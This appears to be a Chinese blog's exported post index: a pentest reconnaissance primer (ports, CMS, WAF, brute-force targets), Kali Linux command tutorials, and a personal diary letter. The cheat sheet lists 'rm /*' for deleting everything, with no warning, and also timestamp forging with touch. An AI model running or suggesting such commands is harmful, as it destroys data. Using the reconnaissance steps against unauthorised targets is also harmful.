开篇说明\n\n\n\n\n\n\n\n\n\n一切从信息收集开始\n信息收集的作用\n\n\n\n\n\n\n\n\n为什么要进行信息收集？答：当我们要对一个目标进行渗透测试的时候为了防止无从下手，我们首先要获取目标的信息，掌握详细的情况，了解目标的弱点和安全短板，知己知彼，才能百战不殆。在渗透测试时信息收集是我们的第一步，信息收集的全面性对于后期的渗透工作必为重要，甚至关联到能不能挖掘到漏洞\n\n信息收集什么信息收集举例小故事：\n\n\n\n\n\n\n\n\n\n哇！女神！！想去搭讪但是不敢！！！\n她是谁？她是哪个班的？她微信是什么？\n舔狗在寻找目标\n\n姓名、微信号：目标人物\n班级：目标环境\n爱干的事情、喜好：目标事件\n\n目标人物：电话、邮箱、密码、whois等\n目标环境：域名、脚本语言、数据库、中间件、框架、cms、开放端口等\n目标事件：历史漏洞、使用手册、使用说明、通告、公众号等\n总之就是收集一切对我们有帮助的信息\n\n常见的端口服务说明\n数据库：关系型数据库、NOSQL数据库\n\n关系型数据库\n\n\n\n\n\n\n\n\nOracle 数据库 端口：1521\npointbase 端口：9092\nDB2 端口：5000\nOracle XDB （XML 数据库）端口：8080\nmySQL 端口：3306  管理员账户：root\nmssSQL 端口：1433 | 1434 管理员账户：sa\nN0SQL 数据库\n\n\n\n\n\n\n\n\nMongoDB 端口：27017\nRedis 端口：6379\nmemcached 端口：11211\n端口是可以修改的\n服务\n\n\n\n\n\n\n\n\n端口：21\tFTP（文件传输）协议\n端口：23\tTelnet（远程登录）协议\n端口：80 &#x2F; 8080 &#x2F; 3128 &#x2F; 8081 &#x2F; 9080\tHTTP协议代理服务器常用端口号\n端口：110\tPOP3 Post Office Protocol（E-mail）\n端口：22\t  SSH（安全登录）、SCP（文件传输）、端口重定向\n端口：69\t  TFTP（Trivial File Transfer Protocol）\n端口：443\tHTTPS（securely transferring web pages）\n端口：3389   远程桌面协议（ROP）\n端口：8080\tOracle XDB FTP 服务\n端口：8080\tJBOSS\n端口：8080\tTOMCAT\n端口：7001\tWebLogic\n端口：9090\tWebshpere 管理工具\n端口：9080\tWebshpere应用程序\n\n攻击路线文件共享远程连接Web应用服务数据库服务邮件服务网络常见协议特殊服务端口\n通过信息收集可以做什么\n\n\n\n\n\n\n\n\n渗透测试的灵魂就是信息收集\n\nCMS 可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击\n这些危险端口开放了我们就可以尝试入侵。例如 445 | 3306 | 22 | 1433 | 6379可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站\n\n信息收集报告编写\n\n\n\n\n\n\n\n\n编写信息收集报告就是记录我们在信息收集时收集到的信息\n目标人物：电话、邮箱、密码、whois等\n目标环境：域名、脚本语言、数据库、中间件、框架、CMS、开放端口等\n目标事件：历史漏洞、使用手册、使用说明、通知、公众号、手机APP\n具体文档可在网上查询\n\n目标人物\n\n\n\n\n\n\n\n\n\nwhois\n网站管理员\n邮箱 | 反查\n电话\n···\n目标事件\n\n\n\n\n\n\n\n\n\n公众号\n小程序\n手机APP\n通知\n使用说明\n使用手册\n历史漏洞\n···\n域名\n\n\n\n\n\n\n\n\n\n子域名\n子域名的子域名\n证书\n···\n脚本语言\n\n\n\n\n\n\n\n\n\nPHP\nJSP\nASP\nASPX\n···\n数据库\n\n\n\n\n\n\n\n\n\nMySQL\nMsSQL\nOracle\n···\n目录爬行\n\n\n\n\n\n\n\n\n\n目录遍历\n目录文件\n···\n目录浏览（相当于爬虫）\n\n\n\n\n\n\n\n\n\nrobots.txt\t— 爬虫协议，可能会泄露信息给我们\n目录地址 | 登陆\n框架所开发的路由\n···\n源码泄露\n\n\n\n\n\n\n\n\n\n.svn\n.git\n备份文件\n···\n中间件\n\n\n\n\n\n\n\n\n\nIIS\napache\nnginx\n···\n服务器系统\n\n\n\n\n\n\n\n\n\nwindows\nlinux\n···\nDNS解析\n\n\n\n\n\n\n\n\n\n作为域名和IP地址相互映射的一个分布式数据库，DNS协议运行在UDP协议之上，使用端口号53，在 RFC 文档中 RFC 2181 对 DNS 有规范说明，RTC 2136 对 DNS 的动态更新进行说明 RFC 2308 对 DNS 查询的反向缓存进行说明（可以在漏洞人生查看信息）\n\n\n\n\n\n\n\n\n\n阿里云\n西部数码\n传送域漏洞\n···\nCMS\n\n\n\n\n\n\n\n\n\ndedecms\nwordperss\n框架\n\n\n\n\n\n\n\n\n\nthinkphp\nStruts2\n···\n开放端口\n\n\n\n\n\n\n\n\n\nHTTP：80\nFTP：21\nMySQL：3306\n···\n目标IP\n\n\n\n\n\n\n\n\n\n阿里云\n历史解析\n超级ping\n···\nC 段地址\n\n\n\n\n\n\n\n\n\nIP\n域名\n···\nIDC\n\n\n\n\n\n\n\n\n\n阿里云\n某某互联\n···\nWAF\n\n\n\n\n\n\n\n\n\n云盾\n云锁\n安全狗\n安全卫士\n···\n图床\n\n\n\n\n\n\n\n\n\n七牛云\n阿里云\n···\n安全措施\n\n\n\n\n\n\n\n\n\n自定义404、伪静态处理、流量防护等\nCDN\n\n百度云加速\n加速乐\n\n···\n第三方资源引入\n\n\n\n\n\n\n\n\n\nSDK\nJS\n···\n旁站\n\n\n\n\n\n\n\n\n\n上面过程再来一遍\n","slug":"Kali-LinuxPTPAIillustrate","date":"2021-09-16T15:31:50.000Z","categories_index":"网安知识","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"cc3812c2f7f46f2b32f85906a1da705c","title":"kali-Linux 软件管理","content":"软件管理Lali Linux 系列第三篇\nDpkg\n\n\n\n\n\n\n\n\ndpkg 是一个 Debian 的一个命令行工具，它可以用来安装、删除、构建和管理 Debian 的软件包\n安装软件\n\n\n\n\n\n\n\n\n\ndpkg -i xxx.deb\n如果安装出错（缺少依赖），我们需要更新Kali的源\n\n\n\n\n\n\n\n\n\napt -get upgrade\n\n\n\n\n\n\n\n\n\napt –fix-broken install\n卸载软件\n\n\n\n\n\n\n\n\n\ndpkg -r xxx.deb\t— 删除软件包\ndpkg -r –purge xxx.deb\t— 连同配置文件一起删除\nGdebi\n\n\n\n\n\n\n\n\ngdebi 是一个轻量级的 deb 安装工具，它能代替臃肿的 ubuntu软件中心安装 deb\n安装gdebi\n\n\n\n\n\n\n\n\n\nsudo apt-get update  — 更新系统\nsudo apt-get install gdebi — 安装软件\n安装软件\n\n\n\n\n\n\n\n\n\nsudo gdebi xxx.deb 选择Y即可 — 这个是命令行，当然还包含图形化安装\n\n压缩命令Linux 下常用的压缩文件格式\n\n\n\n\n\n\n\n\n\n.zip\n.gz\n.bz2\n.tar.gz\n.tar.bz2\ntar 命令打包命令\n\n\n\n\n\n\n\n\n\ntar -czvf &lt;打包后的文件名&gt; &lt;源文件名&gt;\n解包命令\n\n\n\n\n\n\n\n\n\ntar -xzvf &lt;指定解包文件&gt;\ntar 打包时的选项\n\n\n\n\n\n\n\n\n\n-c\t— 打包\n-z\t— 打包同时进行压缩\n-v\t— 打包时显示出详细信息（可选）\n-f\t— 指定打包文件名\ntar 解包时的选项\n\n\n\n\n\n\n\n\n\n-x\t— 解包\n-z\t— 解包时同时解压\n-v\t— 解包时显示出详细信息（可选）\n-f\t— 指定解包的文件名\n参考：参考文件\n\n搜索命令find命令\n\n\n\n\n\n\n\n\nfind 是通过搜索目录，并输出一个内容\n指定目录查找并输出\n\n\n\n\n\n\n\n\n\nfind .&#x2F;kali&#x2F; -print\n指定目录以 Shell 脚本运行并输出\n\n\n\n\n\n\n\n\n\nfind .&#x2F;kali&#x2F; -exec ls {} ;\nfind .&#x2F;kali&#x2F; -exec ls -l {} ;\t— -l查看权限信息\n参考：参考文件\n","slug":"kali-LinuxSoftwareManagement","date":"2021-09-15T16:50:30.000Z","categories_index":"程序","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"21348f87081c3c6b810e9ce2ff21660c","title":"kali-Linux 基础","content":"kali-Linux基础Lali Linux 系列第一篇\n在线命令查找：Linux命令参考\n实验没用环境情况下可以在网上搜索在线PHP工具来测试在线代码工具\nKali-Linux代码介绍su root --- 切换到Root\nsudo su --- 注册Root\nPasswd root --- 输入新密码并重新输入改密码，注册Root\n:w !sudo tee %  --- 管理员身份强制保存只读文件\nlastb --- 查看目前与过去登入系统的用户相关信息\nusers --- 查看在线用户\nchmod --- 权限管理\ncat &#x2F;etc&#x2F;passwd --- 查看用户信息\ncat &#x2F;etc&#x2F;group --- 查看用户组\nid &lt;用户名&gt; --- 查看指定用户信息\nid &lt;组名&gt; --- 查看指定用户组信息\nuseradd -m &lt;用户名&gt;  --- 自动在home文件夹下创建&lt;用户&gt;目录 - 添加用户\nuseradd -g &lt;组名&gt; &lt;用户名&gt; --- 指定添加在某个组里\npasswod &lt;用户名&gt;\t  --- 修改用户的新密码\nuserdel -r &lt;用户名&gt;  --- 删除目录以及用户\ngroups &lt;用户名&gt;      --- 查看用户组归属\nusermod -g &lt;组名&gt; &lt;用户名&gt; --- 添加组 直接添加组用用户从原来组\nusermod -a-G &lt;组名&gt; &lt;用户名&gt; --- 追加到新的组\ngroupdel &lt;组名&gt; 删除组\n\ncat &#x2F;etc&#x2F;shells --- 查看它支持哪些Shells\necho $SHELLS --- 查看使用的哪个Shells，$是变量的意思|区分大小写\nservice ssh status --- 查看SSH服务是否开启（开机必查）\n&#x2F;etc&#x2F;init.d&#x2F;ssh status --- 查看SSH服务是否开启，方式二\nservice ssh start --- 开启Shells服务，（必须开启）\nsystemctl status ssh --- 查看运行状态\n\nifconfig --- 查询IP地址，远程连接等需要IP使用（不建议使用固定IP地址）\nifconfig eth0 192.168.1.65 --- 给eth0配置固定的IP地址，当然可以固定网关、子网掩码。具体看命令参考的介绍\nservice apache2 start --- 开启阿帕奇服务（自动开启WEB服务，在eth0端口查看）\n\nclear --- 刷新屏幕\nreset --- 完全刷新终端屏幕\nls --- 查看目录下文件和dir命令一样\nls -a --- 查看隐藏文件 -A取消隐藏文件\nls -l --- 查看文件权限划分（查看文件权限）\nls -lt --- 时间排序查看文件\ndir --- 查看目录下文件和ls命令一样\n&lt;指令&gt; -help --- 查看指令的帮助命令\npwd --- 查看当前目录\ncd --- 切换目录，cd ~ 快速进入root目录|cd &#x2F; 进入根目录\ncp &lt;文件名1&gt;.txt &lt;目录路径&gt; --- 将文件复制粘贴在一个目录里\nmv &lt;文件名&gt; &lt;重命名&gt; --- 文件改名\nmv &lt;文件名&gt; &lt;目标路径&gt; --- 移动文件\nfile &lt;文件名&gt; --- 查看文件的类型信息\ntar -czvf &lt;文件&gt;.tar &lt;文件&gt; ---- 打包压缩文件\ntar zxvf &lt;文件&gt;.tar --- 解压文件\nzip --- 压缩zip文件（具体请看命令参考的详细信息）\nunzip &lt;文件&gt;.zip --- 解压zip文件（具体请看命令参考的详细信息）\nwget --- 下载命令\ngit clone &lt;地址&gt; --- 下载git项目，clone克隆的意思\nwget &lt;图片地址&gt; --- 下载图片\napt-get install &lt;软件名称&gt; --- 下载安装软件、文件\ndpkg -i &lt;安装包名称&gt; --- 安装软件（如果报错请下载依赖：debian或ubuntu软件管理包）\nsudo apt-get update --- 更新系统\ndpkg -r &lt;安装包名称&gt; --- 删除软件包\ndpkg -r --purge &lt;安装包名称&gt; --- 连同配置文件一起删除（卸载）\n\nrm &lt;文件&gt; --- 删除文件\nrm -rf --- 强制删除文件目录等 f是强制删除 r是递归删除\nmkdir &lt;文件夹名称&gt; --- 创建一个文件夹\ntouch &lt;文件名称&gt;.txt --- 创建文件\nvim &lt;文件名&gt;.txt --- 进入文件命令模式，具体参考VM编辑器的使用\ncat &lt;文件名&gt;.txt --- 查看文件内容（少的）\nmore &lt;文件名&gt;.txt --- 查看文件内容（多的）\nstat &lt;文件名&gt;.txt --- 查看文件存储、时间信息\nwc &lt;文件名&gt;.txt --- 查看文件的行数、字数、字节数\nman nmap --- 帮助我们查看Nmap软件的帮助文件\nfind &lt;地址文件etc&#x2F;passwd&gt; --- 根据要求查找文件也可以查找文件内容（具体请看命令参考的详细信息）\nman nmap &gt;&gt; &lt;文件名&gt;.text --- 将Nmap帮助文件内容输入在文件内\ntouch -c -t 09112003 &lt;文件名&gt;.text --- 将文件时间改为，9月11日20点03分 -c 不创建任何文件\ntouch -d &quot;2 days ago&quot; &lt;文件名&gt;.text --- 将文件时间修改为2天以前根据系统时间改（具体请看命令参考的详细信息）\n\napt update -y &amp;&amp; apt install xfonts-intl-chinese ttf-wqy-microhei --- 安装字体\necho LANG&#x3D;&quot;zh_CN.UTF-8&quot; &gt; &#x2F;etc&#x2F;default&#x2F;locale --- 官方虚拟机包运行可设置系统语言为中文\ndpkg-reconfigure locales --- 更换语言\ndpkg-reconfigure locales --- 安装字体\napt-get update &amp;&amp; apt-get dist-upgrade -y --- 刷新系统更新源\n\nrm &#x2F;* 删除所有文件、文件目录\n\nLinux常用命令介绍\n帮助命令：在 Linux 环境中，如果遇到困难，可以使用帮助命令来取得帮助\n常用系统工作命令：Linux 中有一些是常用的系统工作命令\n系统状态检测命令：在 Linux 有一些可以查看 Linux 配置系统的基本命令\n工作目录切换命令：在 Linux中，工作目录指的是用户当前在系统中所处的位置\n文本文件编辑命令\n文件目录管理命令\n打包压缩与搜索命令\n文件管理权限命令（Linux分为用户和组的感念）\n\n在线命令查找：Linux命令参考\nechon命令\nechon命令用于在终端输出字符串或变量提取后的值，格式为&quot;echo[字符串 | $变量] &quot;\n\ndate命令\ndate命令用于显示以及设置系统的时间或日期，格式为&quot;date [选项] [+指定的格式]&quot;\n\npoweroff命令\npoweroff命令用于关闭系统，其格式为poweroff\n\ntop命令\n显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率等,格式为&quot;top [参数]&quot;\n\nifconfig命令\nifconfig命令用于获取网卡配置与网络状态等信息，格式为&quot;ifconfig [网络设备] [参数]&quot;\n\nuname命令\nuname命令用于查看系统内核与系统版本等信息，格式为&quot;uname [-a]&quot;\n\nwho命令\nwho命令用于查看当前登入主机的用户终端信息，格式为&quot;who [参数]&quot;\n\nhistory命令\nhistory命令用于显示历史执行过的命令，格式为&quot;history [-c]&quot;\n\npwd命令\npwd命令用于显示用户当前所处的工作目录，格式为&quot;pwd [选项]&quot;\n\ncd命令\ncd命令用于切换工作路径，格式为&quot;cd [目录名称]&quot;\n\nls命令\nls命令用于显示目录中的文件信息，格式位&quot;ls [选项] [文件]&quot;\n\ncat命令\ncat命令用于查看纯文本文件（内容较少的），格式为&quot;cat [选项] [文件]&quot;\n\nmore命令\nmore命令用于查看纯文本文件（内容较多的），格式为&quot;more [选项] [文件]&quot;\n\nhead命令\nhead命令用于查看纯文本文档的前N行，格式为&quot;head [选项] [文件]&quot;\n\nwc命令\nwc命令用于统计指定文本的行数、字数、字节数，格式为&quot;wc [参数] 文本&quot;\n\nstat命令\nstat命令用于查看文件的具体存储信息和时间等信息，格式为&quot;stat 文件名称&quot;\n\ntouch命令\ntouch命令用于创建空白文件或设置文件的时间信息，格式为&quot;touch [选项] [文件]&quot;\n\nmkdir命令\nmkdir命令用于创建空白的文件目录，格式为&quot;mkdir [选项] [目录名称]&quot;\n\ncp命令\ncp命令用于复制文件或文件目录，格式为&quot;cp [选项] [源文件] [目标文件]&quot;\n\nmv命令\nmv命令用于移动文件或将文件重命名，格式为&quot;mv [选项] [源文件] [目标路径|目标文件名]&quot;\n\nfile命令\nfile命令用于查看文件的类型，格式为&quot;file [文件名]&quot;\n\ntar命令\ntar命令用于对文件进行打包压缩或解压，格式为&quot;tar [选项] [文件]&quot;\n\nfind命令\nfind命令用于按照指定条件来查找文件，格式为&quot;find [查找路径] [寻找条件] [操作]&quot;\n\n\n\n常用命令简洁解释cat --- 查看文本文件（内容少的）\nmore --- 查看文本文件（内容多的）\nhead --- 查看文本文档的前N行\nwc --- 统计指定文本的行数、字数、字节数\nstat --- 查看文本的存储、时间等信息\necho --- 输出命令，它可以和map帮助命令一样使用帮助我们创建文件\ndate --- 查看时间\npoweroff --- 关机\ntop --- 和 Windos 任务管理器功能类似（防卡死、检测程序是否执行）\nifconfig --- 查看网络信息\nuname --- 查看用户、系统信息\nwho --- 查看终端、本地连接用户信息\nwhoami --- 查看自己的用户信息\nhistory --- 查看用户指令历史（默认保存1000条）可查看其他用户的操作\nlastb --- 查看目前与过去登入系统的用户相关信息\npwd --- 查看当前目录\ncd --- 切换目录\nls --- 查看目录下文件\ntouch --- 创建空白文件或改变文件时间信息\nmkdir --- 创建空白文件目录\ncp --- 复制文件或文件目录\nmv --- 移动文件或重命名文件\nfile --- 查看文件类型\ntar --- 对文件进行打包压缩或解压\nfind --- 按照指定条件查找文件\ngrep --- h\nchmod --- 权限管理\nwget --- 下载命令\nrm --- 删除\nrm &#x2F;* --- 所有东西\n\n\n文件管理权限命令使用 chmod 命令进行文件的权限修改\n\n\n\n\n\n\n\n\n\nchmod [选项] &lt; 模式, 模式… &gt; &lt;文件名&gt;\n文件和目录的权限\n\n\n\n\n\n\n\n\n\nLinux 中文件和目录的权限有所不同\n\n文件权限\n\nr --- 可以读文件  数值为4\nw --- 可以写文件  数值为2\nx --- 可以执行文件 数值为1\n\n\n目录权限\n\nx r --- 可以读取（cp）和查看（ls）目录的内容（即文件和目录），同时还需要可执行权限\nx w --- 可以在目录里创建文件（touch）和目录（mkdir）和删除文件（rm）和目录（rmdir），同时还需要可执行权限\nx x --- 可以进入目录（cd）和执行文件 实践过程\n\n\n\n\nKali Linux 系统更新源# 阿里源\ndeb https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib\ndeb-src https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib\n \n# 清华大学\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free\ndeb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free\n\n# 中科大\ndeb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali main non-free contrib\ndeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali main non-free contrib\ndeb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali-security kali&#x2F;updates main contrib non-free\n\n\n什么是Shell在计算机科学中Shell 俗称外壳（用来区别于内核），它类似于Windows的DOS系统，能够接收用户的命令并翻译给操作系统执行，是用户与操作系统（内核）之间的桥梁。\n查看Shell查看系统支持哪些 Shell（命令）：eat /etc/shells查看正在使用的Shell：echo $SHELL\nShell与终端的区别\n终端：接收用户的输入，并传递给Shell程序，接收程序输出并展示到屏幕。\nShell：接收并解析用户的指令给操作系统，将结果输出到终端。建议采用Zsh终端\n\n\nVM编辑器VM编辑器是所有Unix及Linux系统下标准的编辑器，就相当于Windows系统中的记事本一样，它的强大不逊色与任何最新的文本编辑器。它是我们使用Linux系统不能缺少的工具。\n\nvim具有程序编辑的能力，可以以字体颜色辨别语法的正确性，方便程序设计；\nvim可以当作vi的升级版本，它可以用多种颜色的方式来显示一些特殊的信息；\nvim会依据文件扩展名或者是文件内的头部信息，判断该文件的内容而自动的执行该程序的语法判断式，再以颜色来显示程序代码与一般信息；\nvim里面加入了很多额外的功能，例如支持正则表达式的搜索、多文件编辑、块复制等等。这对于我们在Liunx上进行一些配置文件的修改工作是很棒的功能；\n\nVM编辑器的使用（代码介绍）Vi &#x2F; Vim 编辑器模式：\n\n命令模式（默认：刚进入Vim的时候，默认就是命令模式，可以复制行、删除行等。\n输入模式：可以输入内容。\n\n**模式转化 **:使用insert键切换进入输入模式：命令模式 –&gt; 输入模式：\n\n\n\n\n\n\n\n\n\ni ：在当前光标所在字符的前面，转为输入模式I ：在当前光标所在行的行首，转化为输入模式a ：在当前光标所在字符的后面，转化为输入模式A ：在当前光标所在行尾，转化为输入模式o ：在当前光标所在行的下方，新建一行，并转化为输入模式O ：在当前光标所在行的上方，新建一行，并转化为输入模式s ：删除光标所在字符r ：替换光标处字符\n输入模式 –&gt; 命令模式\n\n\n\n\n\n\n\n\n\nESC键\n关闭、保存文件\n\n\n\n\n\n\n\n\n\nShift+：号命令模式下：w ：保存q ：退出wq 和 x 都是保存退出q! ：强制退出w! ：强制保存，管理员才有权限\n查找\n\n\n\n\n\n\n\n\n\n普通模式：&#x2F;PATTERN ：从当前位置向后查找?PATTERN ：从当前位置向前查找\n","slug":"kaliLinux_jcjs","date":"2021-09-15T15:50:25.000Z","categories_index":"程序","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"7089909c52921da8a7e4b62be6b9e913","title":"kali-Linux 用户组","content":"kali-Linux 用户组Lali Linux 系列第二篇\n用户组介绍\n\n\n\n\n\n\n\n\n在 Linux 中，每个文件都是属于一个用户的，而每个用户都属于一个用户组\n在 Linux 中，可以同时拥有N多个用户，和用户组\n在 Linux 中，用户分为三类：系统用户（Root用户）、普通用户（指用户所创建的用户）、虚拟用户（指软件所创建的虚拟用户）\n用户信息解释\n\n\n\n\n\n\n\n\n\nbai : x :1001 : 0 :: &#x2F;home&#x2F;bai:&#x2F;bin&#x2F;sh\nbai：表示用户名\n“:”：表示分割线\nx：表示密码，我们看到是x，其实密码已经映射到 &#x2F;etc&#x2F;shadow 文件中，也就是为了保密\n1001：表示用户UID\n0：表示用户组\n&#x2F;home&#x2F;bai：表示用户的目录\n\n“:”：为分隔符\n第一个root为用户名\n第二个x为密码\n第三个0为UID\n第四个0为GID\n第五个root为用户全名\n第六个&#x2F;root为用户的家目录所在位置：beinan这个用户\n第七&#x2F;bin&#x2F;bash为用户所用SHELL的类型\n还是不明白可以参考：说明文件\n用户组解释\n\n\n\n\n\n\n\n\n\nroot : x : 0 : root,key\n“:”为分隔符\n第一个 root 为组名\n第二个 x 为密码，保存在 shadow文件\n第三个 0 为组ID\n第四个root为组成员\n第五个Key代表第二个组成员\n还是不明白可以参考说明文件\n在 Linux 中查看用户信息使用下面的指令\n\n\n\n\n\n\n\n\n\ncat &#x2F;etc&#x2F;passwd\n在 Linux 中查看用户组信息使用下面的指令\n\n\n\n\n\n\n\n\n\ncat &#x2F;etc&#x2F;group\n查看指定的用户信息\n\n\n\n\n\n\n\n\n\nid &lt;用户名称&gt;\n查看指定的用户组信息\n\n\n\n\n\n\n\n\n\nid &lt;组名&gt;\n用户组的概念\n\n\n\n\n\n\n\n\n文件拥有者：就是文件的创作者，谁创建的文件，谁就是文件的所有者\n\n\n\n\n\n\n\n\n\n用户所在组：当 Linux 当前用户创建了一个文件后，则这个文件所属于的组便是这个用户所在的组\n\n\n\n\n\n\n\n\n\n其他组：除了文件所有者以及所在组的用户外，系统其他的用户都是文件的其他组\n用户管理useradd --help  \t--- 查看帮助命令\ncat &#x2F;etc&#x2F;passwd\t\t--- 查看用户信息\nuseradd -m &lt;用户名&gt;  --- 自动在home文件夹下创建&lt;用户&gt;目录 - 添加用户\nuseradd -g &lt;组名&gt; &lt;用户名&gt; --- 指定添加在某个组里\npasswod &lt;用户名&gt;\t  --- 修改用户的新密码\nuserdel -r &lt;用户名&gt;  --- 删除目录以及用户\ngroups &lt;用户名&gt;      --- 查看用户组归属\nusermod -g &lt;组名&gt; &lt;用户名&gt; --- 添加组 直接添加组用用户从原来组\nusermod -a-G &lt;组名&gt; &lt;用户名&gt; --- 追加到新的组\ngroupdel &lt;组名&gt; 删除组\n\n权限管理权限划分\n\n\n\n\n\n\n\n\nr 表示读文件 数值为4\nw 表示写文件 数值为2\nx 表示执行 数值为1\n查看权限\n\n\n\n\n\n\n\n\n当前目录下 ls -l\nd rwx r-x r-x. 2 root root 36864 Aug 9 19:37 bin\nd rwx r-x r-x. 2 root root 4096  Jun 28 2011 eyc\nd rwx r-x r-x. 2 root root 4096  Jun 28 2011 games\nd rwx r-x r-x. 3 root root 4096  Aug 7 19:00 include\n\n\n\n\n\n\n\n\n\n\nd 表示文件类型：\n\n“-“ 普通文件\nd   目录文件\np   管理文件\nl    链接文件\nb   块设备文件\nc   字符设备文件\ns   套接字文件\n\n\n\n\n\n\n\n\n\n\nrwx r-x r-x. 表示文件权限：r 读权限 w 写权限 x 可执行权限 - 无权限\nrwx 表示所有者 &#x2F; 所有者权限\nr-x 组用户权限（一个组中除所有者拥有的权限）\nr-x. 其他用户权限（除过当前有所有者的组，其他组可以进行访问的权限）\n[数值] 对于普通文件：链接数，对于目录文件：第一级子目录数\nroot 第一个为用户名\nroot 第二个为组名\n[数值] 文件大小（单位：字节）\nAug 9 19:37 最后修改时间信息\nbin 文件名\n设置权限\n\n\n\n\n\n\n\n\nchmod 命令\nchmod 777 文件名\t给当前文件设置为777权限（可随意操作权限）\nchmod -R 777 目录名\t给当前目录递归权限为777\n权限演示游戏：游戏\n","slug":"kaliLinux_UserIntroduction","date":"2021-09-15T15:29:50.000Z","categories_index":"程序","tags_index":"教学文档,Kali Linux","author_index":"Arvin"},{"id":"fd7cda3b15cda6572f4b2f4d3048a4a7","title":"【無憂樹洞】致未来的你，情书","content":"我说，我想感觉你，我刷新这个页面，就有一条新消息。然后我刷新了，就真的有了一条新消息。\n昨儿被闺蜜拉着出去逛公园，赤脚踩在草地上，感受太阳的温度，大地的温度，接一接地气，吸收下大自然的能量。感觉就好像跟你在约会。被你拉出去约会，哈哈。\n我真的是那种，自己没什么想法，不太会主动去做些什么，但是无论把我扔到什么环境，什么事情里面，我都会享受其中的。我一直在想，我要如何可以让自己有能量去行动。\n昨儿去我妈家里，我妈跟我爸，就是没说几句话，就会吵吵嚷嚷的，好像这是他们一种相处的模式，你说，人老了之后，就是找个伴儿吗?哪怕是相互嫌弃相互争吵，而如果真的对方不在了，是不是也会不习惯？我不知道。没有什么人让我特别依赖和依恋，我也没有那样习惯到不习惯的感觉。我前夫离开我的很大的一个原因，可能就是他感觉不到我需要他吧。虽然我明明很热烈，也很渴望炙热的甚至黏腻的感情，哈哈。。。因为不是你吧。。哈哈。。但是我想，如果再和什么人有什么亲密的关系，我一定不希望彼此是争吵的，我是个吵不起来的人，因为不喜欢争执，也不希望彼此是不了解的，没有什么比可以说话更重要。嗯，我就是这样想的。甚至，如果我可以这样和你自言自语，是不是也不需要什么人来说话了。。。毕竟，找个可以说话的人也是很麻烦的事情。哈哈。\n我妈早上来我家搞卫生，我就骑车车出门了，我总觉得，她打扫的时候，我不在是更方便和合适的，他们都有家里的钥匙，进门都自己开，我也时常觉得，这只是一个住的地方。家应该是什么样子？又是什么感觉呢？儿子长大了，开始霸占我的房间，这是一个一居室的老房子，客厅还算比较大，之前特地给他做了高低铺，上面可以睡觉，下面有写字台，最近还给他装了帘子，让他可以有自己的空间，但是他还是喜欢在房间里。我就给他买了小桌子，起码不用趴在床上去写作业。可是我不喜欢，房间里充斥着他的味道（孩子长大了，就有人味了，哈哈。。。），我也不喜欢，房间里，有很多怎么都收拾不干净的东西，写完作业也不会当天晚上把书包就收了，然后地上，就是各种书，衣服。他喜欢玩游戏，玩着玩着就会不自觉得大声说话，我也不喜欢。他还不喜欢洗澡，不会每天都洗澡。\n每个人都是不一样的，就算是我的儿子，我们还有那么多不同的喜好，不同的习惯。我只是不喜欢，这是我们的不同。我也不会要求他必须如何。该说的说了，他也不会改变。而我时常反思，为什么我们总是要要求孩子改变，为什么我们总是要说这是好的习惯，那是不好的习惯，而除了要求孩子，我们还有什么方式可以去让他养成我们自认为好的习惯呢？我对于教育孩子甚至没有兴趣。我觉得孩子该是什么样子就是什么，我对此没有什么焦虑。该踩的坑，该走的路，始终都是要自己去亲历的。很多人接受不了我对孩子这种姿态。我的闺蜜，我的前夫，也总是会劝说和不断的希望影响我。我们都不喜欢被指责，被教导，甚至被要求。而我也时常觉得，我还是得把自己过好了，这是唯一的中心。我把自己过好了，周围的一切自然会有该有的变化。\n所以，关系是很累的。无论怎样的关系，总是伴随着控制和被控制，要求和被要求。讨好迎合。期待或失望。我们都没有长大。所以也给不了什么成熟的关系，和成熟的姿态。可是如果有人愿意，这样一起慢慢的共同的长大，是不是也挺好。你说，我是该死心呢，绝望呢，还是。。。哈哈。。。这真是一个不用动脑子的问题，该发生的自然会发生，该遇见的自然会遇见，这种事情，用力都没用。该有的业力，怎么都逃不掉。没有的缘分，怎么都争取不到。可是不管怎样，我都还是要努力去做自己的功课。我还是要去解决没有什么行动力的问题。\n我早上出门，就想着吃吃吃，不吃不吃，然后我就特别难受。有时候我觉得我对身体也是很陌生的，祂不吃也不饿，吃也不饱。可以吃很少，也可以一直吃，也不会饱。可是祂还是物理存在的。我还是要调整这个物理存在。转了一圈，我什么也没吃，回家了，然后哭了一会。哈。。。我想找人说说话的，也觉得没什么人是可以麻烦的。看，我们活的多乖，多懂事，以及，多孤独。孤独是人的一种属性。那个时候，我想，也许，我们真的是可以一个人走下去的，也不需要多余的人，因为其实没有人会明白和了解另外一个人。没有什么感同身受。甚至我自己也不明白。我不知道什么时候就会有情绪，甚至被情绪控制，那些情绪或者念头好像也跟我没什么关系。有时候走在大街上，也觉得很陌生，仿佛我就不属于这里。我也不知道什么时候，身体的某个部位就开始不舒服。我也不知道什么时候就觉得特别无力，什么都不想做。我上午没有吃什么，回来吃了一个苹果。然后被闺蜜拉出去逛街。看中一个蜡烛的香薰，蜡烛是很好的仪式用品，带着连接的能量。那个味道也很好，是我喜欢的，有安息香的成分。我想这也许也是你给的一种指引。和闺蜜在一起的时候，吃了甜品，提拉米苏的千层，我喜欢提拉米苏，是因为之前有人说，提拉米苏代表带我走，在内心很深的地方，我们总是渴望依靠什么人，总是渴望被抱持。尽管我们也真的要从这样的无依无靠的绝望中，生长出自己的力量。跟闺蜜分开之后，就又一个人去吃吃吃了，我安顿不好情绪，就只能用吃吃吃来安顿。索性，吃完，情绪就安分了。然后又可以好好想想，到底要怎样。\n我坐在店铺靠窗的位置，二楼。看着十字路口，人来人